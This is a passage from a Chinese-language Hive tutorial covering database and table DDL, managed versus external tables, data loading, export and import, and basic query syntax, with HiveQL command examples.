class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）创建一个数据库，指定数据库在HDFS上存放的位置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create database db_hive2 location <span class="token string">'/db_hive2.db'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-查询数据库"><a href="#2-2-查询数据库" class="headerlink" title="2.2 查询数据库"></a>2.2 查询数据库</h2><p>1）显示数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show databases<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）显示数据库信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）显示数据库详细信息，extended</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database extended db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）切换当前数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> use db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-修改数据库"><a href="#2-3-修改数据库" class="headerlink" title="2.3 修改数据库"></a>2.3 修改数据库</h2><p>用户可以使用ALTER DATABASE命令为某个数据库的DBPROPERTIES设置键-值对属性值，来描述这个数据库的属性信息。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter database db_hive <span class="token keyword">set</span> dbproperties<span class="token punctuation">(</span><span class="token string">'createtime'</span><span class="token operator">=</span><span class="token string">'20170830'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在hive中查看修改结果</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc database extended db_hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-删除数据库"><a href="#2-4-删除数据库" class="headerlink" title="2.4 删除数据库"></a>2.4 删除数据库</h2><p>1）删除空数据库</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span>drop database db_hive2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）如果删除的数据库不存在，最好采用 if exists判断数据库是否存在</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> drop database db_hive<span class="token punctuation">;</span>FAILED: SemanticException <span class="token punctuation">[</span>Error 10072<span class="token punctuation">]</span>: Database does not exist: db_hivehive<span class="token operator">></span> drop database <span class="token keyword">if</span> exists db_hive2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）如果数据库不为空，可以采用cascade命令，强制删除</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> drop database db_hive<span class="token punctuation">;</span>FAILED: Execution Error, <span class="token keyword">return</span> code 1 from org.apache.hadoop.hive.ql.exec.DDLTask. InvalidOperationException<span class="token punctuation">(</span>message:Database db_hive is not empty. One or <span class="token function">more</span> tables exist.<span class="token punctuation">)</span>hive<span class="token operator">></span> drop database db_hive cascade<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-5-创建表"><a href="#2-5-创建表" class="headerlink" title="2.5 创建表"></a>2.5 创建表</h2><p><strong>1）建表语法</strong></p><pre class="line-numbers language-bash"><code class="language-bash">CREATE <span class="token punctuation">[</span>EXTERNAL<span class="token punctuation">]</span> TABLE <span class="token punctuation">[</span>IF NOT EXISTS<span class="token punctuation">]</span> table_name -<span class="token punctuation">[</span><span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>COMMENT table_comment<span class="token punctuation">]</span> <span class="token punctuation">[</span>PARTITIONED BY <span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>CLUSTERED BY <span class="token punctuation">(</span>col_name, col_name, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token punctuation">[</span>SORTED BY <span class="token punctuation">(</span>col_name <span class="token punctuation">[</span>ASC<span class="token operator">|</span>DESC<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span> INTO num_buckets BUCKETS<span class="token punctuation">]</span> <span class="token punctuation">[</span>ROW FORMAT row_format<span class="token punctuation">]</span> <span class="token punctuation">[</span>STORED AS file_format<span class="token punctuation">]</span> <span class="token punctuation">[</span>LOCATION hdfs_path<span class="token punctuation">]</span><span class="token punctuation">[</span>TBLPROPERTIES <span class="token punctuation">(</span>property_name<span class="token operator">=</span>property_value, <span class="token punctuation">..</span>.<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>AS select_statement<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2）字段解释说明</strong> </p><p>（1）CREATE TABLE 创建一个指定名字的表。如果相同名字的表已经存在，则抛出异常；用户可以用 IF NOT EXISTS 选项来忽略这个异常。</p><p>（2）<strong>EXTERNAL 关键字可以让用户创建一个外部表</strong>，在建表的同时可以指定一个指向实际数据的路径（LOCATION），<strong>在删除表的时候，内部表的元数据和hdfs数据会被一起删除，而外部表只删除元数据，不删除存在hdfs上的数据。</strong></p><p>（3）COMMENT：为表和列添加注释。</p><p>（4）PARTITIONED BY创建分区表</p><p>（5）CLUSTERED BY创建分桶表</p><p>（6）SORTED BY不常用，对桶中的一个或多个列另外排序</p><p>（7）ROW FORMAT </p><p>DELIMITED [FIELDS TERMINATED BY char] [COLLECTION ITEMS TERMINATED BY char]</p><p>​    [MAP KEYS TERMINATED BY char] [LINES TERMINATED BY char] </p><p>  | SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, …)]</p><p>用户在建表的时候可以自定义SerDe或者使用自带的SerDe。如果没有指定ROW FORMAT 或者ROW FORMAT DELIMITED，将会使用自带的SerDe。在建表的时候，用户还需要为表指定列，用户在指定表的列的同时也会指定自定义的SerDe，Hive通过SerDe确定表的具体的列的数据。</p><p>SerDe是Serialize/Deserilize的简称， hive使用Serde进行行对象的序列与反序列化。</p><p>（8）STORED AS指定存储文件类型</p><p>常用的存储文件类型：SEQUENCEFILE（二进制序列文件）、TEXTFILE（文本）、RCFILE（列式存储格式文件）</p><p>如果文件数据是纯文本，可以使用STORED AS TEXTFILE。如果数据需要压缩，使用 STORED AS SEQUENCEFILE。</p><p>（9）LOCATION ：指定表在HDFS上的存储位置。</p><p>（10）AS：后跟查询语句，根据查询结果创建表。</p><p>（11）LIKE允许用户复制现有的表结构，但是不复制数据。</p><h3 id="2-3-1-内部表-管理表"><a href="#2-3-1-内部表-管理表" class="headerlink" title="2.3.1 内部表(管理表)"></a>2.3.1 内部表(管理表)</h3><p>1）理论</p><p>默认创建的表都是所谓的管理表，有时也被称为内部表。因为这种表，Hive会（或多或少地）控制着数据的生命周期。Hive默认情况下会将这些表的数据存储在由配置项hive.metastore.warehouse.dir(例如，/user/hive/warehouse)所定义的目录的子目录下。  当我们删除一个管理表时，Hive也会删除这个表中数据。管理表不适合和其他工具共享数据。</p><p>（1）普通创建表</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student<span class="token punctuation">(</span><span class="token function">id</span> int, name string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span>stored as textfilelocation <span class="token string">'/user/hive/warehouse/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）根据查询结果创建表（查询的结果会添加到新创建的表中）</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student2 as <span class="token keyword">select</span> id, name from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）根据已经存在的表结构创建表</p><pre class="line-numbers language-bash"><code class="language-bash">create table <span class="token keyword">if</span> not exists student3 like student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查询表的类型</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted student2<span class="token punctuation">;</span>Table Type:       MANAGED_TABLE <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-2-外部表"><a href="#2-3-2-外部表" class="headerlink" title="2.3.2 外部表"></a>2.3.2 外部表</h3><p>1）理论</p><p>因为表是外部表，所以Hive并非认为其完全拥有这份数据。删除该表并不会删除掉这份数据，不过描述表的元数据信息会被删除掉。</p><p>2）管理表和外部表的使用场景</p><p>每天将收集到的网站日志定期流入HDFS文本文件。在外部表（原始日志表）的基础上做大量的统计分析，用到的中间表、结果表使用内部表存储，数据通过SELECT+INSERT进入内部表。</p><p>3）案例实操</p><p>分别创建部门和员工外部表，并向表中导入数据。</p><p>（1）上传数据到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir /student<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）建表语句，创建外部表</p><p>创建部门表</p><pre class="line-numbers language-bash"><code class="language-bash">create external table <span class="token keyword">if</span> not exists dept<span class="token punctuation">(</span>deptno int,dname string,loc int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）查看创建的表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>show tables<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看表格式化数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted dept<span class="token punctuation">;</span>Table Type:       EXTERNAL_TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）删除外部表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> drop table dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>外部表删除后，hdfs中的数据还在，但是metadata中dept的元数据已被删除</p><h3 id="2-5-3-管理表与外部表的互相转换"><a href="#2-5-3-管理表与外部表的互相转换" class="headerlink" title="2.5.3 管理表与外部表的互相转换"></a>2.5.3 管理表与外部表的互相转换</h3><p>（1）查询表的类型</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> desc formatted student2<span class="token punctuation">;</span>Table Type:       MANAGED_TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）修改内部表student2为外部表</p><pre class="line-numbers language-bash"><code class="language-bash">alter table student2 <span class="token keyword">set</span> tblproperties<span class="token punctuation">(</span><span class="token string">'EXTERNAL'</span><span class="token operator">=</span><span class="token string">'TRUE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）修改外部表student2为内部表</p><pre class="line-numbers language-bash"><code class="language-bash">alter table student2 <span class="token keyword">set</span> tblproperties<span class="token punctuation">(</span><span class="token string">'EXTERNAL'</span><span class="token operator">=</span><span class="token string">'FALSE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：(‘EXTERNAL’=’TRUE’)和(‘EXTERNAL’=’FALSE’)为固定写法，区分大小写！</p><h2 id="2-6-修改表"><a href="#2-6-修改表" class="headerlink" title="2.6 修改表"></a>2.6 修改表</h2><h3 id="2-6-1-重命名表"><a href="#2-6-1-重命名表" class="headerlink" title="2.6.1 重命名表"></a>2.6.1 重命名表</h3><p>1）语法</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name RENAME TO new_table_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）实操案例</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition2 <span class="token function">rename</span> to dept_partition3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-6-2-增加-修改-替换列信息"><a href="#2-6-2-增加-修改-替换列信息" class="headerlink" title="2.6.2 增加/修改/替换列信息"></a>2.6.2 增加/修改/替换列信息</h3><p>1）语法</p><p>（1）更新列</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name CHANGE <span class="token punctuation">[</span>COLUMN<span class="token punctuation">]</span> col_old_name col_new_name column_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span> <span class="token punctuation">[</span>FIRST<span class="token operator">|</span>AFTER column_name<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）增加和替换列</p><pre class="line-numbers language-bash"><code class="language-bash">ALTER TABLE table_name ADD<span class="token operator">|</span>REPLACE COLUMNS <span class="token punctuation">(</span>col_name data_type <span class="token punctuation">[</span>COMMENT col_comment<span class="token punctuation">]</span>, <span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：ADD是代表新增一字段，字段位置在所有列后面(partition列前)，REPLACE则是表示替换表中所有字段。</p><p>2）实操案例</p><p>（1）查询表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）添加列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept add columns<span class="token punctuation">(</span>deptdesc string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）更新列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept change column deptdesc desc string<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5）替换列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept replace columns<span class="token punctuation">(</span>deptno string, dname string, loc string<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-7-删除表"><a href="#2-7-删除表" class="headerlink" title="2.7 删除表"></a>2.7 删除表</h2><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> drop table dept<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="3-DML数据操作"><a href="#3-DML数据操作" class="headerlink" title="3  DML数据操作"></a>3  DML数据操作</h1><h2 id="3-1-数据导入"><a href="#3-1-数据导入" class="headerlink" title="3.1 数据导入"></a>3.1 数据导入</h2><p>让hdfs的数据和hive表产生关联。上传表数据：hive创建的表其实就是hdfs中的一个目录，所以表数据就映射为hdfs目录下的数据txt。</p><h3 id="3-1-1-向表中装载数据（Load）"><a href="#3-1-1-向表中装载数据（Load）" class="headerlink" title="3.1.1 向表中装载数据（Load）"></a>3.1.1 向表中装载数据（Load）</h3><p><strong>1）语法</strong></p><p>hive&gt; load data [local] inpath ‘数据的path’ [overwrite] into table student [partition (partcol1=val1,…)];</p><p>（1）load data:表示加载数据</p><p>（2）local:表示从本地加载数据到hive表；否则从HDFS加载数据到hive表</p><p>（3）inpath:表示加载数据的路径</p><p>（4）overwrite:表示覆盖表中已有数据，否则表示追加</p><p>（5）into table:表示加载到哪张表</p><p>（6）student:表示具体的表</p><p>（7）partition:表示上传到指定分区</p><p><strong>2）实操案例</strong></p><p>（0）创建一张表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table student<span class="token punctuation">(</span>id string, name string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）加载本地文件到hive</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/student.txt'</span> into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）加载HDFS文件到hive中</p><p>上传文件到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/hive/datas/student.txt /user/molly/hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载HDFS上数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/user/molly/hive/student.txt'</span> into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）加载数据覆盖表中已有的数据</p><p>上传文件到HDFS</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /user/molly/hive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载数据覆盖表中已有的数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data inpath <span class="token string">'/user/molly/hive/student.txt'</span> overwrite into table default.student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-2-通过查询语句向表中插入数据（Insert）"><a href="#3-1-2-通过查询语句向表中插入数据（Insert）" class="headerlink" title="3.1.2 通过查询语句向表中插入数据（Insert）"></a>3.1.2 通过查询语句向表中插入数据（Insert）</h3><p>1）创建一张表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table student_par<span class="token punctuation">(</span>id int, name string<span class="token punctuation">)</span> row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）基本插入数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert into table student_par values<span class="token punctuation">(</span>1,<span class="token string">'wangwu'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>2,<span class="token string">'zhaoliu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）基本模式插入（根据单张表查询结果）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite table student_par <span class="token keyword">select</span> id, name from student <span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>insert into：以追加数据的方式插入到表或分区，原有数据不会删除</p><p>insert overwrite：会覆盖表中已存在的数据</p><p>注意：insert不支持插入部分字段</p><p>4）多表（多分区）插入模式（根据多张表查询结果）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> from student​       insert overwrite table student partition<span class="token punctuation">(</span>month<span class="token operator">=</span><span class="token string">'201707'</span><span class="token punctuation">)</span>​       <span class="token keyword">select</span> id, name where month<span class="token operator">=</span><span class="token string">'201709'</span>​       insert overwrite table student partition<span class="token punctuation">(</span>month<span class="token operator">=</span><span class="token string">'201706'</span><span class="token punctuation">)</span>​       <span class="token keyword">select</span> id, name where month<span class="token operator">=</span><span class="token string">'201709'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-3-查询语句中创建表并加载数据（As-Select）"><a href="#3-1-3-查询语句中创建表并加载数据（As-Select）" class="headerlink" title="3.1.3 查询语句中创建表并加载数据（As Select）"></a>3.1.3 查询语句中创建表并加载数据（As Select）</h3><p>根据查询结果创建表（查询的结果会添加到新创建的表中）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>create table <span class="token keyword">if</span> not exists student3 as <span class="token keyword">select</span> id, name from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-4-创建表时通过Location指定加载数据路径—用的多"><a href="#3-1-4-创建表时通过Location指定加载数据路径—用的多" class="headerlink" title="3.1.4 创建表时通过Location指定加载数据路径—用的多"></a>3.1.4 创建表时通过Location指定加载数据路径—用的多</h3><p>1）上传数据到hdfs上</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir /student<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/student.txt /student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）创建表，并指定在hdfs上的位置</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create external table <span class="token keyword">if</span> not exists student5<span class="token punctuation">(</span>​       <span class="token function">id</span> int, name string<span class="token punctuation">)</span>​       row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span>​       location '/student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先建表，后指定hdfss数据文件到该表。</p><pre class="line-numbers language-bash"><code class="language-bash">hadoop fs -put test.txt /test2.table<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from student5<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-1-5-Import数据到指定Hive表中"><a href="#3-1-5-Import数据到指定Hive表中" class="headerlink" title="3.1.5 Import数据到指定Hive表中"></a>3.1.5 Import数据到指定Hive表中</h3><p>注意：先用export导出后，再将数据导入。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token function">import</span> table student2  from <span class="token string">'/user/hive/warehouse/export/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-数据导出"><a href="#3-2-数据导出" class="headerlink" title="3.2 数据导出"></a>3.2 数据导出</h2><h3 id="3-2-1-Insert导出"><a href="#3-2-1-Insert导出" class="headerlink" title="3.2.1 Insert导出"></a>3.2.1 Insert导出</h3><p>1）将查询的结果导出到本地(有local)</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/export/student'</span>​      <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）将查询的结果<strong>格式化</strong>导出到本地</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>insert overwrite local directory <span class="token string">'/opt/module/hive/datas/export/student1'</span>​      ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="token string">'\t'</span>       <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）将查询的结果导出到HDFS上(没有local)</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite directory <span class="token string">'/user/molly/student2'</span>​       ROW FORMAT DELIMITED FIELDS TERMINATED BY <span class="token string">'\t'</span> ​       <span class="token keyword">select</span> * from student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-Hadoop命令导出到本地"><a href="#3-2-2-Hadoop命令导出到本地" class="headerlink" title="3.2.2 Hadoop命令导出到本地"></a>3.2.2 Hadoop命令导出到本地</h3><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -get /user/hive/warehouse/student/student.txt/opt/module/datas/export/student3.txt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-Hive-Shell-命令导出"><a href="#3-2-3-Hive-Shell-命令导出" class="headerlink" title="3.2.3 Hive Shell 命令导出"></a>3.2.3 Hive Shell 命令导出</h3><p>基本语法：（hive -f/-e 执行语句或者脚本 &gt; file）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive -e <span class="token string">'select * from default.student;'</span> <span class="token operator">></span> /opt/module/hive/datas/export/student4.txt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-Export导出到HDFS上"><a href="#3-2-4-Export导出到HDFS上" class="headerlink" title="3.2.4 Export导出到HDFS上"></a>3.2.4 Export导出到HDFS上</h3><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span>export table default.student to <span class="token string">'/user/hive/warehouse/export/student'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>export和import主要用于两个Hadoop平台集群之间Hive表迁移。</p><h3 id="3-2-5-清除表中数据（Truncate）"><a href="#3-2-5-清除表中数据（Truncate）" class="headerlink" title="3.2.5 清除表中数据（Truncate）"></a>3.2.5 清除表中数据（Truncate）</h3><p>注意：Truncate只能删除管理表，不能删除外部表中数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> truncate table student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-数据查询—用的很多"><a href="#4-数据查询—用的很多" class="headerlink" title="4  数据查询—用的很多"></a>4  数据查询—用的很多</h1><p><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select">查询语句语法</a>：</p><pre class="line-numbers language-bash"><code class="language-bash">SELECT <span class="token punctuation">[</span>ALL <span class="token operator">|</span> DISTINCT<span class="token punctuation">]</span> select_expr, select_expr, <span class="token punctuation">..</span>. FROM table_reference <span class="token punctuation">[</span>WHERE where_condition<span class="token punctuation">]</span> -筛选条件 <span class="token punctuation">[</span>GROUP BY col_list<span class="token punctuation">]</span>---分组 <span class="token punctuation">[</span>HAVING having_condition<span class="token punctuation">]</span>---分组后的过滤条件 <span class="token punctuation">[</span>ORDER BY col_list<span class="token punctuation">]</span>—--全局排序 <span class="token punctuation">[</span>CLUSTER BY col_list—---分区排序<span class="token operator">|</span> <span class="token punctuation">[</span>DISTRIBUTE BY col_list<span class="token punctuation">]</span> –---分区排序  类似MR中的分区<span class="token punctuation">[</span>SORT BY col_list<span class="token punctuation">]</span> –区内排序 <span class="token punctuation">]</span> <span class="token punctuation">[</span>LIMIT number<span class="token punctuation">]</span>--限制返回条数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>HQL查询语法和sql大致相同，这里就不一一列举，这里需要提出说的是排序的用法。</p><p>需要知道的是order by是全局排序，针对所有数据进行排序；SORT BY是分区内的排序</p><h3 